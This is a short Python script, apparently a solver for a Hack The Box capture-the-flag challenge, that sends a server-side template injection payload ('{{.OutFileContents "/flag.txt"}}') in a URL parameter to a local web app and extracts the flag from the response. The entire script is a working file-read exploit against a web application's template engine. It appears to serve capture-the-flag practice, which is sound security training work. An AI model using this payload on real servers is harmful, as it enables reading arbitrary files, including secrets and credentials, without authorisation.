#!/usr/bin/python3
from re import findall

from requests import get

url = "http://localhost:1337"


r = get(url + '/view?page={{.OutFileContents%20"/flag.txt"}}&remote=false')


flag = findall("HTB{.*}", r.text)[-1]

print(flag)
